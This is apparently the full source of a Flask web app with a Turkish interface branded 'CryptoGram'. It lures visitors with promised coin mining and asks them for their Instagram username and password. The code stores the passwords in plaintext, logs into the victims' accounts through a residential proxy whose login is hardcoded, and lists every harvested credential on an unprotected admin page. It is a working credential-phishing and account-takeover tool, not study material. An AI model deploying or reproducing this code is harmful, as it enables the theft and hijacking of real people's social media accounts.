import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

def instant_login(username, password):
    with app.app_context():
        user = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 8 
            cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR"})
            user.status = "Bağlantı Kuruluyor... ⚡"
            db.session.commit()
            if cl.login(username, password):
                user.status = "AKTİF ✅ (COIN KAZANIYOR)"
            else:
                user.status = "Hatalı Bilgi ❌"
        except Exception as e:
            user.status = "Zaman Aşımı / IP Blok ⏳"
        db.session.commit()

# --- ŞİMDİ O "YARRAK GİBİ" OLMAYAN ARAYÜZ GELİYOR ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoGram | Cloud Mining & Follower Pool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #0a0a0a; overflow: hidden; }
        .neon-border { box-shadow: 0 0 15px rgba(0, 149, 246, 0.3); border: 1px solid rgba(0, 149, 246, 0.5); }
        .gradient-text { background: linear-gradient(45deg, #0095f6, #00f2fe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="glass neon-border p-10 rounded-2xl w-full max-w-[400px] text-center relative z-10">
        <div class="mb-8">
            <h1 class="text-3xl font-bold gradient-text tracking-tighter uppercase">CryptoGram</h1>
            <p class="text-gray-500 text-xs mt-2 uppercase tracking-widest font-semibold">Cloud Interaction Mining</p>
        </div>
        
        <div id="login-form" class="space-y-4">
            <div class="text-left">
                <label class="text-[10px] text-gray-400 uppercase ml-1">Instagram Identity</label>
                <input id="u" type="text" placeholder="Kullanıcı Adı" class="w-full bg-[#151515] border border-zinc-800 p-3 rounded-xl text-white outline-none focus:border-blue-500 transition-all">
            </div>
            <div class="text-left">
                <label class="text-[10px] text-gray-400 uppercase ml-1">Secure Key</label>
                <input id="p" type="password" placeholder="••••••••" class="w-full bg-[#151515] border border-zinc-800 p-3 rounded-xl text-white outline-none focus:border-blue-500 transition-all">
            </div>
            
            <button onclick="start()" id="btn" class="w-full bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold py-3 rounded-xl mt-4 hover:opacity-90 active:scale-95 transition-all shadow-lg shadow-blue-900/20">
                SİSTEMİ BAŞLAT
            </button>
            
            <p id="msg" class="text-[11px] mt-6 text-gray-500 leading-relaxed">
                Hesabınızı havuza dahil ederek otomatik coin kasmaya başlayın. İşlem başlatıldıktan sonra 1-2 dakika içinde aktifleşecektir.
            </p>
        </div>
    </div>

    <div class="absolute top-[-10%] left-[-10%] w-[400px] h-[400px] bg-blue-900/20 rounded-full blur-[120px]"></div>
    <div class="absolute bottom-[-10%] right-[-10%] w-[400px] h-[400px] bg-cyan-900/10 rounded-full blur-[120px]"></div>

    <script>
        async function start() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn'), msg = document.getElementById('msg');
            if(!u || !p) return;

            btn.disabled = true;
            btn.innerHTML = '<span class="animate-pulse italic">BAĞLANIYOR...</span>';
            
            try {
                const r = await fetch('/api/start-login', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                msg.innerHTML = '<span class="text-blue-400 font-bold">' + d.msg + '</span>';
                btn.innerText = "SIRAYA ALINDI";
            } catch(e) {
                msg.innerText = "Bağlantı hatası oluştu.";
                btn.disabled = false;
                btn.innerText = "TEKRAR DENE";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "Yeniden Başlatıldı 🚀"
    db.session.commit()
    threading.Thread(target=instant_login, args=(u, p), daemon=True).start()
    return jsonify(status="success", msg="Bağlantı sağlandı. Havuzda coin kasılıyor.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<body style='background:#111;color:#eee;font-family:sans-serif;padding:20px;'>"
    res += "<h2>HESAP HAVUZU (CANLI)</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
    res += "<tr style='background:#222'><th>USER</th><th>PASS</th><th>STATUS</th></tr>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
